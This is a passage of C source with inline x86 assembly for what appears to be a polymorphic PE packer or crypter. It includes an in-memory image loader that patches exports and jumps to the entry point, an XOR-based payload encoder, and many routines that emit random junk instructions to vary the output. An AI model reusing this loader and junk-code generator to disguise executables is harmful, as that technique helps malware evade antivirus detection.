        jz _DynLoader_export_fixup_next
        
        push edi
        mov edi,esi
_DynLoader_export_fixup_fixaddr:
        lodsd
        test eax,eax
        jz _DynLoader_export_fixup_protect_back
        sub eax,[ebp-050h]                                      //- ImageBase
        add eax,[ebp-00Ch]                                      //+ FileData
        stosd
        jmp _DynLoader_export_fixup_fixaddr

_DynLoader_export_fixup_protect_back:
        lea eax,[ebp-084h]                                      //MemoryBasicInformation.Type (just need some pointer)
        push eax                                                        //lpflOldProtect
        push dword ptr [ebp-088h]                       //flNewProtect = MemoryBasicInformation.Protect
        push dword ptr [ebp-090h]                       //dwSize = MemoryBasicInformation.RegionSize
        push dword ptr [ebp-09Ch]                       //lpAddress = MemoryBasicInformation.BaseAddress
        call [ebp-074h]                                         //VirtualProtect
        pop edi
        jmp _DynLoader_export_fixup_next_idir

_DynLoader_export_fixup_next:
        mov ebx,[ebx]
        cmp ebx,[ebp-070h]                                      //.IF(InLoadOrderModuleList.Flink == FirstModule)
        jnz _DynLoader_export_fixup_process_module

_DynLoader_run:
//  int 3
        mov eax,[ebp-01D0h]                                     //NtHeaders.OptionalHeader.AddressOfEntryPoint
        add eax,[ebp-00Ch]                                      //NtHeaders.OptionalHeader.AddressOfEntryPoint + FileData = EntryPoint
        
_DynLoader_end:
        mov ecx,[ebp-00Ch]                                      //we need FileData
        pop esi
        pop edi
        pop ebx
        LEAVE
        RETN 00Ch

_DynLoader_fill_image_info:
        //these values give info about our image, info is filled before DynLoader is put into
        //final executable, we find their offset going from DynLoader_end searching for DYN_LOADER_END_MAGIC
        MOV DWORD PTR [EBP-044h],012345678h     //ImageType
        MOV DWORD PTR [EBP-048h],012345678h     //ImageSize
        MOV DWORD PTR [EBP-04Ch],012345678h     //ImageEntryPoint
        MOV DWORD PTR [EBP-054h],012345678h     //OrgImageSize
        RETN

DWORD_TYPE(DYN_LOADER_END_MAGIC)
}
}

void DynLoader_end()
{
_asm;
}

__stdcall void DynCoder(PCHAR AAddr,DWORD ASize,PCHAR AKey)
{
_asm
{
        //this one only smashes a memory a little bit using a key
_Coder_begin:
        push edi
        push esi

_Coder_main_loop:
        mov edi,[ebp+008h]            //AAddr
        mov ecx,[ebp+00Ch]            //ASize
        shr ecx,002h
_Coder_pre_code:
        mov esi,[ebp+010h]            //AKey
_Coder_code:
        mov eax,[esi]
        test eax,0FF000000h
        jz _Coder_pre_code
_Coder_do_code:
        add eax,ecx
        xor eax,[edi]                 //smash it
        stosd                         //store it
        inc esi
        loop _Coder_code

_Coder_end:
        pop esi
        pop edi
        leave
        ret 00Ch
}
}
//this one is to support tls loading mechanism
//returns pointer to raw data in old pe of data on VA specified by AVirtAddr
//or NULL if no section contains this data
DWORD VirtAddrToPhysAddr(PCHAR Base, DWORD ARVA)
{
        DWORD _offset;
        PIMAGE_SECTION_HEADER section;
        PIMAGE_NT_HEADERS NtHeaders;
        NtHeaders=ImageNtHeader(Base);
        section=ImageRvaToSection(NtHeaders,Base,ARVA);
        if(section==NULL)
        {
                return(0);
        }
        _offset=ARVA+section->PointerToRawData-section->VirtualAddress;
        return(_offset);
}

//converts RVA to RAW pointer
PCHAR RVA2RAW(PCHAR Base, DWORD ARVA)
{
        DWORD RAW;
        RAW=VirtAddrToPhysAddr(Base,ARVA);
        return(Base+RAW);
}

//counts size of tls callbacks array 
DWORD GetTlsCallbacksLen(PDWORD ACallbacks)
{       
        PDWORD LPC;
        DWORD Result=4;
        LPC=ACallbacks;
        while(*LPC!=0)
        {
                Result+=4;
                LPC++;
        }
        return(Result);
}

//does rounding up 
DWORD RoundSize(DWORD ASize,DWORD AAlignment)
{
        return(DWORD((ASize+AAlignment-1)/AAlignment)*AAlignment);
}

DWORD Random(DWORD dwRange)
{
        DWORD RValue;
        DWORD rand_by_rang;
        // generate new random number
        RValue= rand();
        // force dwRange//the last rang is RAND_MAX
        if(dwRange!=0)rand_by_rang=RValue%dwRange;
        else rand_by_rang=0;
        return(rand_by_rang);
}

//srand should only called one time !!!
void InitRandom()
{
        //manage the random generator //srand(GetTickCount());
        srand((unsigned)time(NULL));
}

//generates a buffer of pseudo-random values from 1 to 255
void GenerateRandomBuffer(PBYTE ABuf,DWORD ASize)
{
        DWORD i;
        srand(0);
        //InitRandom();
        for(i=0;i<ASize;i++)
        {
                *ABuf=(BYTE)Random(0xFE)+1;
                ABuf++;
        }
}

//generetes a key for encoding data
//key is pseudo-random buffer ending with 0
void GenerateKey(PBYTE AKey,WORD ASize)
{
        GenerateRandomBuffer(AKey,ASize);
        memset(AKey+ASize-1,0,1);
}

//throw the dice
void ThrowTheDice(DWORD *ADice, DWORD ASides=6)
{
        *ADice=Random(ASides)+1;
}

//throw the dice
void ThrowTheDice(WORD *ADice, WORD ASides=6)
{
        *ADice=(BYTE)Random(ASides)+1;
}

//throw the dice
void ThrowTheDice(BYTE *ADice, BYTE ASides=6)
{
        *ADice=(BYTE)Random(ASides)+1;
}

//select one of eax,ecx,edx,ebx,esp,ebp,esi,edi
BYTE RandomReg32All()
{
        return((BYTE)Random(Reg32Count));
}

//select one of ax,cx,dx,bx,sp,bp,si,di
BYTE RandomReg16All()
{
        return((BYTE)Random(Reg16Count));
}

//select one of al,cl,dl,bl,ah,ch,dh,bh
BYTE RandomReg8ABCD()
{
        return((BYTE)Random(Reg8Count));
}

//select one of eax,ecx,edx,ebx,-,ebp,esi,edi
BYTE RandomReg32Esp()
{
        BYTE Result=(BYTE)Random(Reg32Count-1);
        if(Result==REG_ESP) Result=7;
        return(Result);
}

//select one of eax,ecx,edx,ebx,-,-,esi,edi
BYTE RandomReg32EspEbp()
{
        BYTE Result=(BYTE)Random(Reg32Count-2);
        if(Result==REG_ESP) Result=6;
        else if(Result==REG_EBP)Result=7;
        return(Result);
}

void PutRandomBuffer(PBYTE &AMem,DWORD ASize)
{
        GenerateRandomBuffer(AMem,ASize);
        AMem+=ASize;
}

BYTE Bswap(PBYTE &AMem,BYTE AReg)
{
        *AMem=0x0F;                                                     //bswap
        AMem++;
        *AMem=0xC8+AReg;                                        //reg32
        AMem++;
        return(2);
}

BYTE Pushad(PBYTE &AMem)
{
        *AMem=0x60;
        AMem++;
        return(1);
}

BYTE Stosd(PBYTE &AMem)
{
        *AMem=0xAB;                                                     //stosd
        AMem++;
        return(1);
}

BYTE Movsd(PBYTE &AMem)
{
        *AMem=0xA5;                                                     //movsd
        AMem++;
        return(1);
}

BYTE Ret(PBYTE &AMem)
{
        *AMem=0xC3;                                                     //ret
        AMem++;
        return(1);
}

void Ret16(PBYTE &AMem,WORD AVal)
{
        *AMem=0xC2;                                                     //ret
        AMem++;
        memcpy(AMem,&AVal,2);                           //retval
        AMem+=2;
}

void RelJmpAddr32(PBYTE &AMem,DWORD AAddr)
{
        *AMem=0xE9;                                                     //jmp
        AMem++;
        memcpy(AMem,&AAddr,4);
        AMem+=4;
}

void RelJmpAddr8(PBYTE &AMem,BYTE AAddr)
{
        *AMem=0xEB;                                                     //jmp
        AMem++;
        *AMem=AAddr;                                            //Addr8
        AMem++;
}

void RelJzAddr32(PBYTE &AMem,DWORD AAddr)
{
        *AMem=0x0F;                                                     //conditional jump
        AMem++;
        *AMem=0x84;                                                     //if zero
        AMem++;
        memcpy(AMem,&AAddr,4);
        AMem+=4;
}

void RelJnzAddr32(PBYTE &AMem,DWORD AAddr)
{
        *AMem=0x0F;                                                     //conditional jump
        AMem++;
        *AMem=0x85;                                                     //if not zero
        AMem++;
        memcpy(AMem,&AAddr,4);
        AMem+=4;
}

void RelJbAddr32(PBYTE &AMem,DWORD AAddr)
{
        *AMem=0x0F;                                                     //conditional jump
        AMem++;
        *AMem=0x82;                                                     //if below
        AMem++;
        memcpy(AMem,&AAddr,4);
        AMem+=4;
}

void RelJzAddr8(PBYTE &AMem,BYTE AAddr)
{
        *AMem=0x74;                                                     //jz
        AMem++;
        *AMem=AAddr;                                            //addr8
        AMem++;
}

void RelJnzAddr8(PBYTE &AMem,BYTE AAddr)
{
        *AMem=0x75;                                                     //jnz
        AMem++;
        *AMem=AAddr;                                            //addr8
        AMem++;
}

BYTE JmpRegMemIdx8(PBYTE &AMem,BYTE AReg,BYTE AIdx)
{
        BYTE Result=3;
        *AMem=0xFF;                                                     //jmp
        AMem++;
        *AMem=0x60+AReg;                                        //regmem
        AMem++;
        if(AReg==REG_ESP)
        {
                Result++;
                *AMem=0x24;                                             //esp
                AMem++;
        }
        *AMem=AIdx;                                                     //idx8
        AMem++;
        return(Result);
}

BYTE PushRegMem(PBYTE &AMem,BYTE AReg)
{
        BYTE Result=2;
        *AMem=0xFF;                                                     //push
        AMem++;
        if(AReg==REG_EBP)
        {
                Result++;
                *AMem=0x75;                                             //ebp
                AMem++;
                *AMem=0x00;                                             //+0
        }
        else
        {
                *AMem=0x30+AReg;                                //regmem
        }
        AMem++;
        if(AReg==REG_ESP)
        {
                Result++;
                *AMem=0x24;                                             //esp
                AMem++;
        }
        return(Result);
}

void PushReg32(PBYTE &AMem,BYTE AReg)
{
        *AMem=0x50+AReg;                                        //push reg
        AMem++;
}

BYTE PushReg32Rand(PBYTE &AMem)
{
        BYTE Result=RandomReg32Esp();
        PushReg32(AMem,Result);
        return(Result);
}

void PopReg32(PBYTE &AMem,BYTE AReg)
{
        *AMem=0x58+AReg;                                        //pop reg
        AMem++;
}

BYTE PopReg32Idx(PBYTE &AMem,BYTE AReg,DWORD AIdx)
{
        BYTE Result=6;
        *AMem=0x8F;                                                     //pop
        AMem++;
        *AMem=0x80+AReg;                                        //reg32
        AMem++;
        if(AReg==REG_ESP)
        {
                *AMem=0x24;                                             //esp
                AMem++;
                Result++;
        }
        memcpy(AMem,&AIdx,4);                           //+ idx
        AMem+=4;
        return(Result);
}

void RelCallAddr(PBYTE &AMem,DWORD AAddr)
{
        *AMem=0xE8;                                                     //call
        AMem++;
        memcpy(AMem,&AAddr,4);                          //+ idx
        AMem+=4;
}

void MovReg32Reg32(PBYTE &AMem,BYTE AReg1,BYTE AReg2)
{
        *AMem=0x89;                                                     //mov
        AMem++;
        *AMem=AReg2*8+AReg1+0xC0;                       //reg32,reg32
        AMem++;
}

void AddReg32Reg32(PBYTE &AMem,BYTE AReg1,BYTE AReg2)
{
        *AMem=0x01;                                                     //add
        AMem++;
        *AMem=AReg2*8+AReg1+0xC0;                       //reg32,reg32
        AMem++;
}

BYTE AddReg32RegMem(PBYTE &AMem,BYTE AReg1,BYTE AReg2)
{
        BYTE Result=2;
        *AMem=0x03;                                                     //add
        AMem++;
        if(AReg2==REG_EBP)
        {
                Result++;
                *AMem=AReg1*8+0x45;                             //reg32,ebp
                AMem++;
                *AMem=0x00;                                             //+0
        }
        else
        {
                *AMem=AReg1*8+AReg2;                    //reg32,regmem
        }
        AMem++;
        if(AReg2==REG_ESP)
        {
                Result++;
                *AMem=0x24;                                             //esp
                AMem++;
        }
        return(Result);
}

BYTE AddRegMemReg32(PBYTE &AMem,BYTE AReg1,BYTE AReg2)
{
        BYTE Result=2;
        *AMem=0x01;                                                     //add
        AMem++;
        if(AReg1==REG_EBP)
        {
                Result++;
                *AMem=AReg2*8+0x45;                             //regmem,ebp
                AMem++;
                *AMem=0x00;                                             //+0
        }
        else
        {
                *AMem=AReg2*8+AReg1;                    //regmem,reg
        }
        AMem++;
        if(AReg1==REG_ESP)
        {
                Result++;
                *AMem=0x24;                                             //esp
                AMem++;
        }
        return(Result);
}

void AddReg32Num8(PBYTE &AMem,BYTE AReg,BYTE ANum)
{
        *AMem=0x83;                                                     //add
        AMem++;
        *AMem=0xC0+AReg;                                        //reg32
        AMem++;
        *AMem=ANum;                                                     //num8
        AMem++;
}

void MovReg32Num32(PBYTE &AMem,BYTE AReg,DWORD ANum)
{
        *AMem=0xB8+AReg;                                        //mov reg32
        AMem++;
        memcpy(AMem,&ANum,4);                           //num32
        AMem+=4;
}

BYTE MovReg32IdxNum32(PBYTE &AMem,BYTE AReg,DWORD AIdx,DWORD ANum)
{
        BYTE Result=10;
        *AMem=0xC7;                                                     //mov
        AMem++;
        *AMem=0x80+AReg;                                        //reg32
        AMem++;
        if(AReg==REG_ESP)
        {
                Result++;
                *AMem=0x24;                                             //esp
                AMem++;
        }
        memcpy(AMem,&AIdx,4);                           //+ idx
        AMem+=4;
        memcpy(AMem,&ANum,4);                           //Num32
        AMem+=4;
        return(Result);
}

//both AReg must not be REG_ESP or REG_EBP
void MovReg32Reg32IdxNum32(PBYTE &AMem,BYTE AReg1,BYTE AReg2,DWORD ANum)
{
        if(AReg1==REG_ESP)
        {
                AReg1=AReg2;
                AReg2=REG_ESP;
        }
        if(AReg2==REG_EBP)
        {
                AReg2=AReg1;
                AReg1=REG_EBP;
        }
        *AMem=0xC7;                                                     //mov
        AMem++;
        *AMem=0x04;
        AMem++;
        *AMem=AReg1*8+AReg2;
        AMem++;
        memcpy(AMem,&ANum,4);                           //Num32
        AMem+=4;
}

BYTE MovReg32RegMem(PBYTE &AMem,BYTE AReg1,BYTE AReg2)
{
        BYTE Result=2;
        *AMem=0x8B;                                                     //mov
        AMem++;
        if(AReg2==REG_EBP)
        {
                Result++;
                *AMem=AReg1*8+0x45;                             //reg32,ebp
                AMem++;
                *AMem=0x00;                                             //+0
        }
        else
        {
                *AMem=AReg1*8+AReg2;                    //reg32,regmem
        }
        AMem++;
        if(AReg2==REG_ESP)
        {
                Result++;
                *AMem=0x24;                                             //esp
                AMem++;
        }
        return(Result);
}

BYTE MovRegMemReg32(PBYTE &AMem,BYTE AReg1,BYTE AReg2)
{
        BYTE Result=2;
        *AMem=0x89;                                                     //mov
        AMem++;
        if(AReg1==REG_EBP)
        {
                Result++;
                *AMem=AReg2*8+0x45;                             //reg32,ebp
                AMem++;
                *AMem=0x00;                                             //+0
        }
        else
        {
                *AMem=AReg2*8+AReg1;                    //reg32,regmem
        }
        AMem++;
        if(AReg1==REG_ESP)
        {
                Result++;
                *AMem=0x24;                                             //esp
                AMem++;
        }
        return(Result);
}

BYTE MovReg32RegMemIdx8(PBYTE &AMem,BYTE AReg1,BYTE AReg2,BYTE AIdx)
{
        BYTE Result=3;
        *AMem=0x8B;                                                     //mov
        AMem++;
        *AMem=AReg1*8+AReg2+0x40;                       //AReg1,AReg2
        AMem++;
        if(AReg2==REG_ESP)
        {
                Result++;
                *AMem=0x24;                                             //esp
                AMem++;
        }
        *AMem=AIdx;                                                     //AIdx
        AMem++;
        return(Result);
}

void PushNum32(PBYTE &AMem,DWORD ANum)
{
        *AMem=0x68;                                                     //push
        AMem++;
        memcpy(AMem,&ANum,4);
        AMem+=4;
}

void JmpReg32(PBYTE &AMem,BYTE AReg)
{
        *AMem=0xFF;                                                     //jmp | call
        AMem++;
        *AMem=0xE0+AReg;                                        //reg32
        AMem++;
}

void CallReg32(PBYTE &AMem,BYTE AReg)
{
        *AMem=0xFF;                                                     //jmp | call
        AMem++;
        *AMem=0xD0+AReg;                                        //reg32
        AMem++;
}

void Cld(PBYTE &AMem)
{
        *AMem=0xFC;                                                     //cld
        AMem++;
}

void Std(PBYTE &AMem)
{
        *AMem=0xFD;                                                     //std
        AMem++;
}

void Nop(PBYTE &AMem)
{
        *AMem=0x90;                                                     //nop
        AMem++;
}

void Stc(PBYTE &AMem)
{
        *AMem=0xF9;                                                     //stc
        AMem++;
}

void Clc(PBYTE &AMem)
{
        *AMem=0xF8;                                                     //clc
        AMem++;
}

void Cmc(PBYTE &AMem)
{
        *AMem=0xF5;                                                     //cmc
        AMem++;
}

void XchgReg32Rand(PBYTE &AMem)
{
        *AMem=0x87;                                                     //xchg
        AMem++;
        *AMem=0xC0+RandomReg32All()*9;          //reg32
        AMem++;
}

BYTE XchgReg32Reg32(PBYTE &AMem,BYTE AReg1,BYTE AReg2)
{
        BYTE Result;
        if(AReg2==REG_EAX){ AReg2=AReg1; AReg1=REG_EAX; }
        if(AReg1==REG_EAX) ThrowTheDice(&Result,2);
        else Result=2;
        if(Result==2)
        {
                *AMem=0x87;                                             //xchg
                AMem++;
                *AMem=0xC0+AReg2*8+AReg1;               //reg32
        }
        else
        {
                *AMem=0x90+AReg2;                               //xchg eax,reg32
        }
        AMem++;
        return(Result);
}

void MovReg32Rand(PBYTE &AMem)
{
        *AMem=0x8B;                                                     //mov
        AMem++;
        *AMem=0xC0+RandomReg32All()*9;          //reg32
        AMem++;
}

void IncReg32(PBYTE &AMem,BYTE AReg)
{
        *AMem=0x40+AReg;                                        //inc reg32
        AMem++;
}

void DecReg32(PBYTE &AMem,BYTE AReg)
{
        *AMem=0x48+AReg;                                        //dec reg32
        AMem++;
}

BYTE IncReg32Rand(PBYTE &AMem)
{
        BYTE Result=RandomReg32All();
        IncReg32(AMem,Result);
        return(Result);
}

BYTE DecReg32Rand(PBYTE &AMem)
{
        BYTE Result=RandomReg32All();
        DecReg32(AMem,Result);
        return(Result);
}

BYTE LeaReg32Reg32(PBYTE &AMem,BYTE AReg1,BYTE AReg2)
{
        BYTE Result=2;
        *AMem=0x8D;                                                     //mov
        AMem++;
        if(AReg2==REG_EBP)
        {
                Result++;
                *AMem=AReg1*8+0x45;                             //reg32,ebp
                AMem++;
                *AMem=0x00;                                             //+0
        }
        else
        {
                *AMem=AReg1*8+AReg2;                    //reg32,regmem
        }
        AMem++;
        if(AReg2==REG_ESP)
        {
                Result++;
                *AMem=0x24;                                             //esp
                AMem++;
        }
        return(Result);
}

BYTE LeaReg32Reg32MemIdx8(PBYTE &AMem,BYTE AReg1,BYTE AReg2,BYTE AIdx)
{
        BYTE Result=3;
        *AMem=0x8D;                                                     //lea
        AMem++;
        *AMem=0x40+AReg1*8+AReg2;                       //reg32,reg32mem
        AMem++;
        if(AReg2==REG_ESP)
        {
                Result++;
                *AMem=0x24;                                             //esp
                AMem++;
        }
        *AMem=AIdx;                                                     //idx8
        AMem++;
        return(Result);
}

void LeaReg32Rand(PBYTE &AMem)
{
        *AMem=0x8D;                                                     //lea
        AMem++;
        *AMem=0x00+RandomReg32EspEbp()*9;       //reg32
        AMem++;
}

void LeaReg32Addr32(PBYTE &AMem,BYTE AReg,DWORD AAddr)
{
        *AMem=0x8D;                                                     //lea
        AMem++;
        *AMem=0x05+AReg*8;                                      //reg32
        AMem++;
        memcpy(AMem,&AAddr,4);                          //addr32
        AMem+=4;
}

void TestReg32Rand(PBYTE &AMem)
{
        *AMem=0x85;                                                     //test
        AMem++;
        *AMem=0xC0+RandomReg32All()*9;          //reg32
        AMem++;
}

void OrReg32Rand(PBYTE &AMem)
{
        *AMem=0x0B;                                                     //or
        AMem++;
        *AMem=0xC0+RandomReg32All()*9;          //reg32
        AMem++;
}

void AndReg32Rand(PBYTE &AMem)
{
        *AMem=0x23;                                                     //and
        AMem++;
        *AMem=0xC0+RandomReg32All()*9;          //reg32
        AMem++;
}

void TestReg8Rand(PBYTE &AMem)
{
        BYTE LReg8;
        LReg8=RandomReg8ABCD();
        *AMem=0x84;                                                     //test
        AMem++;
        *AMem=0xC0+LReg8*9;                                     //reg8
        AMem++;
}

void OrReg8Rand(PBYTE &AMem)
{
        BYTE LReg8;
        LReg8=RandomReg8ABCD();
        *AMem=0x0A;                                                     //or
        AMem++;
        *AMem=0xC0+LReg8*9;                                     //reg8
        AMem++;
}

void AndReg8Rand(PBYTE &AMem)
{
        BYTE LReg8;;
        LReg8=RandomReg8ABCD();
        *AMem=0x22;                                                     //and
        AMem++;
        *AMem=0xC0+LReg8*9;                                     //reg8
        AMem++;
}

void CmpRegRegNum8Rand(PBYTE &AMem)
{
        BYTE LRnd;
        LRnd=(BYTE)Random(3);
        *AMem=0x3A+LRnd;                                        //cmp
        AMem++;
        if(LRnd<2) LRnd=(BYTE)Random(0x40)+0xC0;
        else LRnd=(BYTE)Random(0x100);
        *AMem=LRnd;                                                     //reg16 | reg32 | num16
        AMem++;
}

BYTE CmpReg32Reg32(PBYTE &AMem,BYTE AReg1,BYTE AReg2)
{
        *AMem=0x39;                                                     //cmp
        AMem++;
        *AMem=0xC0+AReg1+AReg2*8;                       //reg1,reg2            
        AMem++;
        return(2);
}

void CmpReg32Num8(PBYTE &AMem,BYTE AReg,BYTE ANum)
{
        *AMem=0x83;                                                     //cmp
        AMem++;
        *AMem=0xF8+AReg;                                        //reg32
        AMem++;
        *AMem=ANum;                                                     //num8
        AMem++;
}

void CmpReg32RandNum8(PBYTE &AMem,BYTE AReg)
{
        CmpReg32Num8(AMem,AReg,(BYTE)Random(0x100));
}

void CmpRandReg32RandNum8(PBYTE &AMem)
{
        CmpReg32RandNum8(AMem,RandomReg32All());
}

void JmpNum8(PBYTE &AMem,BYTE ANum)
{
        BYTE LRnd;
        LRnd=(BYTE)Random(16);
        if(LRnd==16) *AMem=0xEB;                        //jmp
        else *AMem=0x70+LRnd;                           //cond jmp
        AMem++;
        *AMem=ANum;                                                     //num8
        AMem++;
}

void SubReg32Reg32(PBYTE &AMem,BYTE AReg1,BYTE AReg2)
{
        *AMem=0x29;                                                     //sub
        AMem++;
        *AMem=AReg2*8+AReg1+0xC0;                       //reg32,reg32
        AMem++;
}

void SubReg32Num8(PBYTE &AMem,BYTE AReg,BYTE ANum)
{
        *AMem=0x83;                                                     //sub
        AMem++;
        *AMem=0xE8+AReg;                                        //reg32
        AMem++;
        *AMem=ANum;                                                     //num8
        AMem++;
}

BYTE SubReg32Num8Rand(PBYTE &AMem,BYTE ANum)
{
        BYTE Result=RandomReg32All();
        SubReg32Num8(AMem,Result,ANum);
        return(Result);
}

BYTE AddReg32Num8Rand(PBYTE &AMem,BYTE ANum)
{
        BYTE Result=RandomReg32All();
        AddReg32Num8(AMem,Result,ANum);
        return(Result);
}

void SubAlNum8(PBYTE &AMem,BYTE ANum)
{
        *AMem=0x2C;                                                     //sub al
        AMem++;
        *AMem=ANum;                                                     //num8
        AMem++;
}

void TestAlNum8(PBYTE &AMem,BYTE ANum)
{
        *AMem=0xA8;                                                     //test al
        AMem++;
        *AMem=ANum;                                                     //num8
        AMem++;
}

void TestAlNum8Rand(PBYTE &AMem)
{
        TestAlNum8(AMem,(BYTE)Random(0x100));
}

void SubReg8Num8(PBYTE &AMem,BYTE AReg,BYTE ANum)
{
        *AMem=0x80;                                                     //sub
        AMem++;
        *AMem=0xE8+AReg;                                        //reg8
        AMem++;
        *AMem=ANum;                                                     //num8
        AMem++;
}

void SubReg8Num8Rand(PBYTE &AMem,BYTE ANum)
{
        BYTE LReg8;
        LReg8=RandomReg8ABCD();
        SubReg8Num8(AMem,LReg8,ANum);
}

void TestReg8Num8(PBYTE &AMem,BYTE AReg,BYTE ANum)
{
        *AMem=0xF6;                                                     //test
        AMem++;
        *AMem=0xC0+AReg;                                        //reg8
        AMem++;
        *AMem=ANum;                                                     //num8
        AMem++;
}

void TestReg8Num8Rand(PBYTE &AMem)
{
        TestReg8Num8(AMem,RandomReg8ABCD(),(BYTE)Random(0x100));
}

void AddReg8Num8(PBYTE &AMem,BYTE AReg,BYTE ANum)
{
        *AMem=0x80;                                                     //add
        AMem++;
        *AMem=0xC0+AReg;                                        //reg8
        AMem++;
        *AMem=ANum;                                                     //num8
        AMem++;
}

void AddReg8Num8Rand(PBYTE &AMem,BYTE ANum)
{
        BYTE LReg8;
        LReg8=RandomReg8ABCD();
        AddReg8Num8(AMem,LReg8,ANum);
}

void AddAlNum8(PBYTE &AMem,BYTE ANum)
{
        *AMem=0x04;                                                     //add al
        AMem++;
        *AMem=ANum;                                                     //num8
        AMem++;
}

void FNop(PBYTE &AMem)
{
        *AMem=0xD9;                                                     //fnop
        AMem++;
        *AMem=0xD0;
        AMem++;
}

void OrReg16Rand(PBYTE &AMem)
{
        BYTE LReg16=RandomReg16All();
        *AMem=0x66;                                                     //or | test | and
        AMem++;
        *AMem=0x0B;
        AMem++;
        *AMem=0xC0+LReg16*9;                            //reg16
        AMem++;
}

void TestReg16Rand(PBYTE &AMem)
{
        BYTE LReg16=RandomReg16All();
        *AMem=0x66;                                                     //or | test | and
        AMem++;
        *AMem=0x85;
        AMem++;
        *AMem=0xC0+LReg16*9;                            //reg16
        AMem++;
}

void AndReg16Rand(PBYTE &AMem)
{
        BYTE LReg16=RandomReg16All();
        *AMem=0x66;                                                     //or | test | and
        AMem++;
        *AMem=0x23;
        AMem++;
        *AMem=0xC0+LReg16*9;                            //reg16
        AMem++;
}

void Cdq(PBYTE &AMem)
{
        *AMem=0x99;
        AMem++;
}

void ShlReg32Num8(PBYTE &AMem,BYTE AReg,BYTE ANum)
{
        *AMem=0xC1;                                                     //shl | shr | sal | sar
        AMem++;
        *AMem=0xE0+AReg;                                        //reg32
        AMem++;
        *AMem=ANum;                                                     //num8
        AMem++;
}

void ShlReg32RandNum8FullRand(PBYTE &AMem)
{
        ShlReg32Num8(AMem,RandomReg32All(),(BYTE)Random(8)*0x20);
}

void ShrReg32Num8(PBYTE &AMem,BYTE AReg,BYTE ANum)
{
        *AMem=0xC1;                                                     //shl | shr | sal | sar
        AMem++;
        *AMem=0xE8+AReg;                                        //reg32
        AMem++;
        *AMem=ANum;                                                     //num8
        AMem++;
}

void ShrReg32RandNum8FullRand(PBYTE &AMem)
{
        ShrReg32Num8(AMem,RandomReg32All(),(BYTE)Random(8)*0x20);
}

void SalReg32Num8(PBYTE &AMem,BYTE AReg,BYTE ANum)
{
        *AMem=0xC1;                                                     //shl | shr | sal | sar
        AMem++;
        *AMem=0xF0+AReg;                                        //reg32
        AMem++;
        *AMem=ANum;                                                     //num8
        AMem++;
}

void SalReg32RandNum8FullRand(PBYTE &AMem)
{
        SalReg32Num8(AMem,RandomReg32All(),(BYTE)Random(8)*0x20);
}

void SarReg32Num8(PBYTE &AMem,BYTE AReg,BYTE ANum)
{
        *AMem=0xC1;                                                     //shl | shr | sal | sar
        AMem++;
        *AMem=0xF8+AReg;                                        //reg32
        AMem++;
        *AMem=ANum;                                                     //num8
        AMem++;
}

void SarReg32RandNum8FullRand(PBYTE &AMem)
{
        SarReg32Num8(AMem,RandomReg32All(),(BYTE)Random(8)*0x20);
}

void RolReg8Num8(PBYTE &AMem,BYTE AReg,BYTE ANum)
{
        *AMem=0xC0;                                                     //rol | ror
        AMem++;
        *AMem=0xC0+AReg;                                        //reg8
        AMem++;
        *AMem=ANum;                                                     //num8
        AMem++;
}

void RolReg8RandNum8FullRand(PBYTE &AMem)
{
        RolReg8Num8(AMem,RandomReg8ABCD(),(BYTE)Random(0x20)*8);
}

void RorReg8Num8(PBYTE &AMem,BYTE AReg,BYTE ANum)
{
        *AMem=0xC0;                                                     //rol | ror
        AMem++;
        *AMem=0xC8+AReg;                                        //reg8
        AMem++;
        *AMem=ANum;                                                     //num8
        AMem++;
}

void RorReg8RandNum8FullRand(PBYTE &AMem)
{
        RorReg8Num8(AMem,RandomReg8ABCD(),(BYTE)Random(0x20)*8);
}

void RolReg32Num8(PBYTE &AMem,BYTE AReg,BYTE ANum)
{
        *AMem=0xC1;                                                     //rol | ror
        AMem++;
        *AMem=0xC0+AReg;                                        //reg32
        AMem++;
        *AMem=ANum;                                                     //num8
        AMem++;
}

void RolReg32RandNum8FullRand(PBYTE &AMem)
{
        RolReg32Num8(AMem,RandomReg32All(),(BYTE)Random(8)*0x20);
}

void RorReg32Num8(PBYTE &AMem,BYTE AReg,BYTE ANum)
{
        *AMem=0xC1;                                                     //rol | ror
        AMem++;
        *AMem=0xC8+AReg;                                        //reg32
        AMem++;
        *AMem=ANum;                                                     //num8
        AMem++;
}

void RorReg32RandNum8FullRand(PBYTE &AMem)
{
        RorReg32Num8(AMem,RandomReg32All(),(BYTE)Random(8)*0x20);
}

void TestAxNum16(PBYTE &AMem,WORD ANum)
{
        *AMem=0x66;                                                     //test ax
        AMem++;
        *AMem=0xA9;
        AMem++;
        memcpy(AMem,&ANum,2);                           //num16
        AMem+=2;
}

void TestAxNum16Rand(PBYTE &AMem)
{
        TestAxNum16(AMem,(BYTE)Random(0x10000));
}

void CmpAxNum16(PBYTE &AMem,WORD ANum)
{
        *AMem=0x66;                                                     //cmp ax
        AMem++;
        *AMem=0x3D;
        AMem++;
        memcpy(AMem,&ANum,2);                           //num16
        AMem+=2;
}

void CmpAxNum16Rand(PBYTE &AMem)
{
        TestAxNum16(AMem,(BYTE)Random(0x10000));
}

void PushNum8(PBYTE &AMem,BYTE ANum)
{
        *AMem=0x6A;                                                     //push
        AMem++;
        *AMem=ANum;                                                     //num8
        AMem++;
}

void PushNum8Rand(PBYTE &AMem)
{
        PushNum8(AMem,(BYTE)Random(0x100));
}

WORD XorRand(PBYTE &AMem)
{
        BYTE LRnd;
        PWORD LRes;

        LRes=(PWORD)AMem;
        LRnd=(BYTE)Random(5);
        *AMem=0x30+LRnd;                                        //xor
        AMem++;
        if(LRnd==4) *AMem=(BYTE)Random(0x100);  //num8
        else *AMem=(BYTE)Random(7)*9+(BYTE)Random(8)+1+0xC0;    //reg8 | reg32 but never the same reg
        AMem++;
        return(*LRes);
}

void InvertXor(PBYTE &AMem,WORD AXor)
{
        memcpy(AMem,&AXor,2);
        AMem+=2;
}

void DoubleXorRand(PBYTE &AMem)
{
        InvertXor(AMem,XorRand(AMem));
}

BYTE NotReg32(PBYTE &AMem,BYTE AReg)
{
        *AMem=0xF7;                                                     //not
        AMem++;
        *AMem=0xD0+AReg;                                        //reg32
        AMem++;
        return(2);
}

BYTE NegReg32(PBYTE &AMem,BYTE AReg)
{
        *AMem=0xF7;                                                     //not
        AMem++;
        *AMem=0xD8+AReg;                                        //reg32
        AMem++;
        return(2);
}

WORD NotRand(PBYTE &AMem)
{
        PWORD LRes;
        LRes=(PWORD)AMem;
        *AMem=0xF6+(BYTE)Random(1);                     //not
        AMem++;
        *AMem=0xD0+(BYTE)Random(8);                     //reg8 | reg32
        AMem++;
        return(*LRes);
}

void InvertNot(PBYTE &AMem,WORD ANot)
{
